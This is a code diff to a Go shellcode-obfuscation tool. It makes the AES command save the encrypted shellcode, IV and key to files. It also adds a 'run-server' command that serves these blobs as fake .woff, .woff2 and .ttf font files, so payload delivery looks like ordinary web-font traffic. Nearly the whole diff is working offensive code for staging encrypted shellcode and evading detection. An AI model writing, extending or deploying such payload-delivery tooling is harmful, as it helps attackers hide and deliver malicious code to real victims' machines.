@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"strconv"
+	"os"
 
 	"github.com/fachrioktavian/paychef/pkg/endecoder"
 	"github.com/fachrioktavian/paychef/pkg/endecryptor"
@@ -10,6 +11,7 @@ import (
 	"github.com/fachrioktavian/paychef/pkg/logger"
 
 	"github.com/spf13/cobra"
+	"github.com/gofiber/fiber/v2"
 )
 
 func PrintBanner() {
@@ -87,16 +89,89 @@ func ObfuscateAes (inAppLogger *logger.InAppLogger, aes *endecryptor.Aes) *cobra
 				inAppLogger.Error("Error reading shellcode", "error", err)
 				return
 			}
-			encodedShellcode, iv, key, err := aes.Encrypt(shellcode, aesKey)
+			encryptedShellcode, iv, key, err := aes.Encrypt(shellcode, aesKey)
 			if err != nil {
 				inAppLogger.Error("Error encrypting shellcode", "error", err)
 				return
 			}
-			formattedShellcode := o.FormatCShellcode(encodedShellcode, iv, key)
+
+			err = os.WriteFile("encrypted_shellcode.bin", encryptedShellcode, 0644)
+			if err != nil {
+				inAppLogger.Error("Error writing encrypted shellcode to file", "error", err)
+				return
+			}
+			inAppLogger.Info("Encrypted shellcode written to file", "file", "encrypted_shellcode.bin")
+			err = os.WriteFile("iv.bin", iv, 0644)
+			if err != nil {
+				inAppLogger.Error("Error writing IV to file", "error", err)
+				return
+			}
+			inAppLogger.Info("IV written to file", "file", "iv.bin")
+			err = os.WriteFile("key.bin", key, 0644)
+			if err != nil {
+				inAppLogger.Error("Error writing key to file", "error", err)
+				return
+			}
+			inAppLogger.Info("Key written to file", "file", "key.bin")
+
+			formattedShellcode := o.FormatCShellcode(encryptedShellcode, iv, key)
 			fmt.Println(formattedShellcode)
 		},
 	}
 }
+
+func RunServer (inAppLogger *logger.InAppLogger) *cobra.Command {
+	inAppLogger = inAppLogger.NewInAppLoggerExtendPrefix("run-server")
+	return &cobra.Command{
+		Use:   "run-server",
+		Short: "Run a server to server encoded/encrypted shellcode",
+		Run: func(cmd *cobra.Command, args []string) {
+			encryptedShellcodeBin := "encrypted_shellcode.bin"
+			ivBin := "iv.bin"
+			keyBin := "key.bin"
+			encryptedShellcode, err := os.ReadFile(encryptedShellcodeBin)
+			if err != nil {
+				inAppLogger.Error("Error reading encrypted shellcode file", "error", err)
+				return
+			}
+			iv, err := os.ReadFile(ivBin)
+			if err != nil {
+				inAppLogger.Error("Error reading IV file", "error", err)
+				return
+			}
+			key, err := os.ReadFile(keyBin)
+			if err != nil {
+				inAppLogger.Error("Error reading key file", "error", err)
+				return
+			}
+			app := fiber.New()
+			app.Get("/:file.:ext", func(c *fiber.Ctx) error {
+				ext := c.Params("ext")
+				if ext == "woff" {
+					// Serve the encrypted shellcode in binary format
+					c.Set("Content-Type", "application/octet-stream")
+					c.Set("Content-Disposition", "attachment; filename=encrypted_shellcode.bin")
+					return c.Send(encryptedShellcode)
+				} else if ext == "woff2" {
+					// Serve the IV in binary format
+					c.Set("Content-Type", "application/octet-stream")
+					c.Set("Content-Disposition", "attachment; filename=iv.bin")
+					return c.Send(iv)
+				} else if ext == "ttf" {
+					// Serve the key in binary format
+					c.Set("Content-Type", "application/octet-stream")
+					c.Set("Content-Disposition", "attachment; filename=key.bin")
+					return c.Send(key)
+				} else {
+					return c.Status(404).SendString("File not found")
+				}
+			})
+			
+			port := cmd.Flag("port").Value.String()
+			app.Listen(":" + port)
+		},
+	}
+} 
 
 func main() {
 	PrintBanner()
@@ -121,9 +196,14 @@ func main() {
 	obfuscateAesCmd.MarkFlagRequired("cshellcode")
 	obfuscateAesCmd.MarkFlagRequired("aesKey")
 
+	runServerCmd := RunServer(inAppLogger)
+	runServerCmd.Flags().StringP("port", "p", "", "Port to run the server on")
+	runServerCmd.MarkFlagRequired("port")
+
 	rootCmd.AddCommand(
 		obfuscateXorCmd,
 		obfuscateAesCmd,
+		runServerCmd,
 	)
 
 	rootCmd.Execute()
